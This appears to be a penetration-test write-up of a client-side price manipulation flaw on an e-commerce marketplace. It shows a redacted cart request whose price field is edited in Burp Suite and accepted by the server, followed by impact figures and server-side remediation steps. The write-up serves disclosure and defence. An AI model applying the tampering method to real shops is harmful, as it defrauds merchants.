---
title: "Price Manipulation via Client-Side Parameter Tampering"
date: 2026-04-02
tags: ["price", "Bug"]
author: "Fernandez"
summary: "Click to read the full walkthrough"
draft: false
---

Severity: ```High ```

Type: ```Penetration Test Assessment```

Severity: ```High```

CWE: ```CWE-602, CWE-840, CWE-284```

⚠️ **Note:** All sensitive information (e.g., domains, endpoints, IDs, and personal data) has been redacted or modified. The core vulnerability and methodology remain unchanged.

## Introduction
There is something about e-commerce applications that makes them particularly interesting to test. The entire business model runs on trust, trust that prices are what they say they are, trust that the server is doing the math, trust that a buyer cannot just decide what they want to pay. When that trust is misplaced and delegated to the client side, the consequences are immediate and financially measurable.
This is the story of how I found a critical price manipulation vulnerability on a client's marketplace platform during a penetration test engagement. One intercepted request. One modified value. The server said yes

## Scope and Setup
The target was an e-commerce marketplace platform built on a modern JavaScript frontend communicating with a REST API backend. The application allowed multiple vendors to list products across various categories including fashion, electronics, and home goods.

My setup was standard:

- Firefox browser with Burp Suite Professional as proxy
  
- A handful of product listings to work with

I started the way I always do, going through the normal user workflow with Burp running in the background, watching every request, looking for anything that shouldn't be there.

## Discovery
After browsing to a product listing, a pair of Women's Flat Shoes priced at ₦8,080. 
<img width="1208" height="907" alt="price manipulation 2" src="https://github.com/user-attachments/assets/7feeae06-e9e9-4bf7-ae52-f8fcbaf7840d" />

You could see the value of the shoe labeled ```8080``` has the same id as what is in the url, the id of ```1746999058975```

I added it to cart and watched the intercepted request in Burp. The request body contained a price field
```html
POST /market-v2/cart/add HTTP/2
Host: redacted.api.redacted.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.REDACTED
Origin: https://www.redacted.com

{
  "product_id": "1746999058975",
  "vendor_id": "VND-23412",
  "quantity": 1,
  "variant": "default",
  "price": 8080,          ← visible in plaintext
  "currency": "NGN",
  "checkout_token": "ck_9f3b2a1d8e49870a"
}
```
## Step 2 — Modify the price field
```"price": 8080  →  "price": 2000```

## Forward and Observer response
```html
HTTP/2 200 OK
Content-Type: application/json

{
  "success": true,
  "response_code": "00",
  "message": "Item added to cart successfully",
  "data": {
    "product_id": "1746999058975",
    "product_name": "Women Flat Shoe",
    "price": 2000,        ← server accepted manipulated value
    "subtotal": 2000,
    "currency": "NGN",
    "checkout_url": "https://redacted.redacted.com/spliplug/spli/pay/553246..."
  }
}
```
<img width="1124" height="817" alt="price manipulation 3" src="https://github.com/user-attachments/assets/866a6061-9e90-4450-a2a2-189511d1f206" />

## Step 4 — Payment gateway initializes at manipulated price
```html
Split Plug payment page loads:
Order Amount:    NGN 2,000.00
Transaction Fee: NGN 130.00
→ Proceed to Paystack at NGN 2,130 total
```
<img width="1262" height="631" alt="price manipulation" src="https://github.com/user-attachments/assets/5bf75ed0-722e-4665-9285-f91449c39770" />

## Root Cause
The backend accepted a price field from the client request body without validating it against the actual product price stored in the database. The server was performing no price lookup of its own. It trusted whatever value arrived in the request.

## Impact
```html
Per transaction loss:    NGN 6,080
Reduction from real:     75%
Products affected:       All products on the platform
Accounts affected:       All buyer accounts
Technical barrier:       None — Burp Suite free tier sufficient
```

## Remediation

1. Remove the price field from the client request entirely
   The server should never accept price from the client

2. Derive price server-side using product_id only
   Look it up from the product catalog database

3. At checkout, re-validate the price server-side
   before initializing any payment gateway session

4. Any discrepancy between expected and received
   price should reject the request entirely

5. Implement server-side integrity checks on all
   financial values before processing
